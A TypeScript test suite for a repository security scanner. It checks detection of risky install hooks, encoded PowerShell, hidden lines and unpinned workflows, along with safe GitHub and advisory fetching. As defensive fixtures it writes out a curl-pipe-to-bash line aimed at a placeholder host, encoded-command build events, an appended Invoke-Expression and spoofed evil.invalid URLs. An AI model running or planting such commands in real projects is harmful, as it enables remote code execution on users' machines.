import {test} from 'node:test';
import assert from 'node:assert/strict';
import {createHash} from 'node:crypto';
import {readFileSync} from 'node:fs';
import {inspectRepositoryFiles,reviewablePath} from '../lib/repository-review';
import {githubRepository,inspectGithubRepository} from '../lib/github-repository-review';
import {inspectGithubAdvisories,repositoryPackages} from '../lib/github-advisories';
import {githubPublicJson} from '../lib/github-public-json';
import {createElement} from 'react';
import {renderToStaticMarkup} from 'react-dom/server';
import RepositoryResults from '../app/workbench/repository/repository-results';

test('signals before build/install without execution or leaking source contents',()=>{
 const report=inspectRepositoryFiles([
  {path:'tool.csproj',text:'<PreBuildEvent>powershell -EncodedCommand SYNTHETIC_ONLY</PreBuildEvent>'},
  {path:'helper.py',text:'# synthetic example'+ ' '.repeat(200)+'hidden_content'},
  {path:'package.json',text:JSON.stringify({scripts:{postinstall:'echo test-only'}})},
  {path:'.github/workflows/test.yml',text:'on: [push, pull_request_target]\njobs:\n  test:\n    uses: owner/repo@main'},
  {path:'README.md',text:'curl https://example.invalid/review-only | bash'},
 ],'en');
 for(const rule of ['build-exec','encoded-shell','concealed-line','install-hook','privileged-pr','unpinned-action','download-execute'])assert(report.findings.some(f=>f.rule===rule));
 assert(!JSON.stringify(report).includes('SYNTHETIC_ONLY'));assert.equal(report.files,5);
 assert(report.findings.every(f=>f.line>0));
});
test('remediated source has no signals; no safe verdict is returned',()=>{
 const result=inspectRepositoryFiles([{path:'.github/workflows/test.yml',text:`on: push\njobs:\n  test:\n    uses: owner/repo@${'a'.repeat(40)}`}],'ko');
 assert.equal(result.findings.length,0);assert(!('safe'in result));
});
test('reproducible harmless install-hook fixtures show only the intended difference',()=>{
 for(const [name,count]of [['vulnerable',1],['remediated',0]] as const){const text=readFileSync(new URL(`./fixtures/repository/${name}/package.json`,import.meta.url),'utf8');const result=inspectRepositoryFiles([{path:'package.json',text}]);assert.equal(result.findings.length,count);if(count)assert.equal(result.findings[0].rule,'install-hook');}
});
test('campaign exact indicators match, hostname suffix spoof does not',()=>{
 assert(inspectRepositoryFiles([{path:'example.txt.md',text:'# documented indicator: muckcoding.com'}]).findings.some(f=>f.rule==='campaign-ioc'));
 assert.equal(inspectRepositoryFiles([{path:'README.md',text:'muckcoding.com.example.invalid'}]).findings.length,0);
});
test('reject secrets, traversal, duplicates, binary and excessive input; cap findings explicitly',()=>{
 for(const path of ['.env','.env.local','a/.git/config','../install.sh','a\\install.sh','/install.sh','tool.exe'])assert(!reviewablePath(path));
 for(const input of [[],[{path:'a.py',text:'\0'}],[{path:'a.py',text:'a'.repeat(65537)}],Array.from({length:31},(_,i)=>({path:i+'.py',text:'x'})),[{path:'a.py',text:'x'},{path:'a.py',text:'y'}]])assert.throws(()=>inspectRepositoryFiles(input));
 const report=inspectRepositoryFiles([{path:'a.ps1',text:Array(200).fill('powershell -EncodedCommand SYNTHETIC').join('\n')}]);
 assert.equal(report.findings.length,150);assert.equal(report.truncated,true);
});
test('GitHub URL cannot turn into arbitrary server fetch or carry credentials',()=>{
 assert.deepEqual(githubRepository('https://github.com/owner/repo/'),{owner:'owner',repo:'repo'});
 for(const url of ['http://github.com/a/b','https://github.com.evil.invalid/a/b','https://localhost/a/b','https://user:pass@github.com/a/b','https://github.com/a/b?x=y','https://github.com/a/b#x','https://github.com/a/b/tree/main','https://github.com/a/b.git','https://github.com/a/%2e%2e'])assert.throws(()=>githubRepository(url));
 assert.throws(()=>githubRepository('not-a-url'),/REPOSITORY_URL/);
});
function mockGithub(entries:{path:string;text:string;mode?:string}[],options:{truncated?:boolean;rateLimit?:boolean;badBlob?:boolean}={}){
 const calls:{url:string;init?:RequestInit}[]=[],sha='a'.repeat(40),tree='b'.repeat(40);
 const blobs=entries.map(e=>({...e,sha:createHash('sha1').update(`blob ${Buffer.byteLength(e.text)}\0`).update(e.text).digest('hex')}));
 const request=(async(url,init)=>{
  calls.push({url:String(url),init});if(options.rateLimit)return new Response('{}',{status:403});
  const path=new URL(String(url)).pathname;
  let value:unknown;
  if(path==='/repos/owner/repo')value={private:false,default_branch:'main'};
  else if(path.endsWith('/commits/main'))value={sha,commit:{tree:{sha:tree}}};
  else if(path.endsWith('/git/trees/'+tree))value={truncated:options.truncated??false,tree:blobs.map(b=>({path:b.path,sha:b.sha,type:'blob',mode:b.mode??'100644',size:Buffer.byteLength(b.text)}))};
  else {const blob=blobs.find(b=>path.endsWith('/git/blobs/'+b.sha));assert(blob);value={encoding:'base64',size:Buffer.byteLength(blob.text),content:Buffer.from(options.badBlob?'x'.repeat(blob.text.length):blob.text).toString('base64')};}
  return Response.json(value);
 }) as typeof fetch;return {request,calls};
}
test('remote review pins commit, verifies blob hashes and reports bounded partial coverage',async()=>{
 const mock=mockGithub(Array.from({length:14},(_,i)=>({path:i+'.py',text:'# example '+i})),{truncated:true});
 const result=await inspectGithubRepository('https://github.com/owner/repo','en',new AbortController().signal,mock.request);
 assert.equal(result.commit,'a'.repeat(40));assert.equal(result.report?.files,12);assert.equal(result.coverage.skipped.length,2);assert.equal(result.coverage.treeTruncated,true);assert.equal(result.coverage.partial,true);
 assert.equal(mock.calls.length,15);for(const call of mock.calls){assert.equal(new URL(call.url).hostname,'api.github.com');assert.equal(call.init?.redirect,'error');assert(!JSON.stringify(call.init?.headers).includes('Authorization'));}
});
test('remote errors, symlinks, zero candidates, cancellation and corrupt blobs fail honestly',async()=>{
 const limited=mockGithub([],{rateLimit:true});await assert.rejects(inspectGithubRepository('https://github.com/owner/repo','en',new AbortController().signal,limited.request),/GITHUB_RATE_LIMIT/);
 const symlink=mockGithub([{path:'install.sh',text:'example',mode:'120000'}]);const result=await inspectGithubRepository('https://github.com/owner/repo','en',new AbortController().signal,symlink.request);assert.equal(result.report,null);assert.equal(symlink.calls.length,3);
 const corrupt=mockGithub([{path:'a.py',text:'test'}],{badBlob:true});await assert.rejects(inspectGithubRepository('https://github.com/owner/repo','en',new AbortController().signal,corrupt.request),/GITHUB_UNAVAILABLE/);
 const aborted=mockGithub([]);await assert.rejects(inspectGithubRepository('https://github.com/owner/repo','en',AbortSignal.abort(),aborted.request));assert.equal(aborted.calls.length,0);
});
test('documentation cannot starve executable source selection and oversized upstream bodies stop',async()=>{
 const mock=mockGithub([...Array.from({length:20},(_,i)=>({path:`docs/${i}/README.md`,text:'# reference'})),{path:'README.md',text:'# project'},{path:'helper.py',text:'# helper'}]);
 const result=await inspectGithubRepository('https://github.com/owner/repo','en',new AbortController().signal,mock.request);
 assert.deepEqual(result.coverage.checkedFiles.slice(0,2),['README.md','helper.py']);
 const large=(async()=>new Response('x'.repeat(32769))) as typeof fetch;
 await assert.rejects(inspectGithubRepository('https://github.com/owner/repo','en',new AbortController().signal,large),/GITHUB_RESPONSE_TOO_LARGE/);
});
test('read-only IOC comparisons are reference context, while appended commands remain review signals',()=>{
 const line="$matches = @(Get-NetTCPConnection -State Established | Where-Object { $_.RemoteAddress -in @('130.12.182.172','130.12.182.209') })";
 const reference=inspectRepositoryFiles([{path:'check.ps1',text:line}]);assert.equal(reference.summary.code,'reference_only');assert.equal(reference.findings[0].severity,'info');assert.equal(reference.summary.reviewCount,0);
 const altered=inspectRepositoryFiles([{path:'check.ps1',text:line+'; Invoke-Expression $payload'}]);assert.equal(altered.summary.code,'review_required');
 const real=inspectRepositoryFiles([{path:'check.ps1',text:readFileSync(new URL('../scripts/check-github-campaign.ps1',import.meta.url),'utf8')}]);assert.equal(real.summary.code,'reference_only');
});
test('lockfile exception remains bounded and exact inventory never guesses ranges or aliases',()=>{
 const inventory=repositoryPackages([{path:'package.json',text:JSON.stringify({dependencies:{next:'^16.0.0',react:'npm:other@1.0.0','bad,name':'1.0.0'}})},{path:'package-lock.json',text:JSON.stringify({lockfileVersion:3,packages:{'node_modules/next':{version:'16.4.2'},'node_modules/react':{version:'19.2.0'},'node_modules/a/node_modules/next':{version:'16.0.0'}}})}]);
 assert.equal(inventory.packages.length,3);assert.equal(inventory.unresolvedPackages.length,0);
 assert.doesNotThrow(()=>inspectRepositoryFiles([{path:'package-lock.json',text:' '.repeat(70000)+'{}'}]));
 assert.throws(()=>inspectRepositoryFiles([{path:'package-lock.json',text:' '.repeat(262145)}]));
});
const advisoryFiles=[{path:'package.json',text:JSON.stringify({dependencies:{'example-package':'1.0.0'}})}];
function advisoryRow(){return {ghsa_id:'GHSA-abcd-1234-efgh',cve_id:'CVE-2050-12345',type:'reviewed',withdrawn_at:null,summary:'Synthetic advisory, not a real vulnerability assertion',severity:'high',vulnerabilities:[{package:{ecosystem:'npm',name:'example-package'},vulnerable_version_range:'<1.0.1',first_patched_version:'1.0.1'}]};}
test('advisory lookup requires explicit consent and returns source, range and patch for exact versions',async()=>{
 let calls=0;
 const request=(async(url,init)=>{calls++;const parsed=new URL(String(url));assert.equal(parsed.origin,'https://api.github.com');assert.equal(parsed.pathname,'/advisories');assert.equal(parsed.searchParams.get('affects'),'example-package@1.0.0');assert.equal(parsed.searchParams.get('type'),'reviewed');assert.equal(init?.redirect,'error');assert(!String(url).includes('dependencies'));return Response.json([advisoryRow()]);}) as typeof fetch;
 assert.equal((await inspectGithubAdvisories(advisoryFiles,false,new AbortController().signal,request)).status,'not_requested');assert.equal(calls,0);
 const result=await inspectGithubAdvisories(advisoryFiles,true,new AbortController().signal,request);assert.equal(calls,1);assert.equal(result.checks[0].status,'matched');assert.equal(result.checks[0].advisories[0].ranges[0].patched,'1.0.1');assert.equal(result.checks[0].advisories[0].url,'https://github.com/advisories/GHSA-abcd-1234-efgh');
});
test('advisory failures, invalid responses and package limits never become clean results',async()=>{
 const files=[{path:'package.json',text:JSON.stringify({dependencies:Object.fromEntries(Array.from({length:7},(_,i)=>['example'+i,'1.0.0']))})}];let calls=0;
 const limited=(async()=>{calls++;return new Response('{}',{status:403});}) as typeof fetch;
 const result=await inspectGithubAdvisories(files,true,new AbortController().signal,limited);assert.equal(result.status,'partial');assert.equal(calls,1);assert.equal(result.omittedPackages,2);assert.equal(result.checks[0].status,'unavailable');assert(result.checks.slice(1).every(c=>c.status==='not_checked'));
 for(const row of [{...advisoryRow(),withdrawn_at:'2020-01-01'},{...advisoryRow(),ghsa_id:'https://evil.invalid/'}]){const malformed=(async()=>Response.json([row])) as typeof fetch;const r=await inspectGithubAdvisories(advisoryFiles,true,new AbortController().signal,malformed);assert.equal(r.checks[0].status,'unavailable');}
 const noMatch=(async()=>Response.json([])) as typeof fetch;assert.equal((await inspectGithubAdvisories(advisoryFiles,true,new AbortController().signal,noMatch)).checks[0].status,'no_matches');
 let arbitraryCalls=0;await assert.rejects(githubPublicJson('https://evil.invalid/advisories',100,new AbortController().signal,(async()=>{arbitraryCalls++;return Response.json([]);}) as typeof fetch));assert.equal(arbitraryCalls,0);
});
test('rendered result separates reference-only findings, unqueried advisories and unsupported lockfiles',async()=>{
 const report=inspectRepositoryFiles([{path:'check.ps1',text:readFileSync(new URL('../scripts/check-github-campaign.ps1',import.meta.url),'utf8')}]);
 const advisories=await inspectGithubAdvisories([],false,new AbortController().signal);
 const html=renderToStaticMarkup(createElement(RepositoryResults,{result:{report,advisories},locale:'ko',download:()=>{}}));
 assert(html.includes('탐지된 항목은 비교용 참고값입니다'));assert(html.includes('취약점 권고: 미조회'));assert(!html.includes('review_required'));assert(html.includes('저장소 전체가 안전하다고 판단할 수도 없습니다'));
 const legacy=await inspectGithubAdvisories([{path:'package-lock.json',text:JSON.stringify({lockfileVersion:1,dependencies:{example:{version:'1.0.0'}}})}],true,new AbortController().signal);
 assert.equal(legacy.status,'partial');assert.equal(legacy.unparsedFiles.length,1);assert.equal(legacy.checks.length,0);
});
test('remote lockfiles above ordinary source limits are inspected; advisory failure preserves source evidence',async()=>{
 const lock=' '.repeat(70000)+JSON.stringify({lockfileVersion:3,packages:{'node_modules/example-package':{version:'1.0.0'}}});
 const mock=mockGithub([{path:'package-lock.json',text:lock}]);
 const result=await inspectGithubRepository('https://github.com/owner/repo','ko',new AbortController().signal,mock.request);
 assert.equal(result.report?.files,1);assert.equal(result.advisories.eligiblePackages,1);assert.equal(result.advisories.status,'not_requested');assert.equal(mock.calls.length,4);
 const unavailable=mockGithub([{path:'package.json',text:advisoryFiles[0].text}]);
 const partial=await inspectGithubRepository('https://github.com/owner/repo','ko',new AbortController().signal,unavailable.request,true);
 assert.equal(partial.report?.files,1);assert.equal(partial.advisories.status,'partial');assert.equal(partial.advisories.checks[0].status,'unavailable');
});
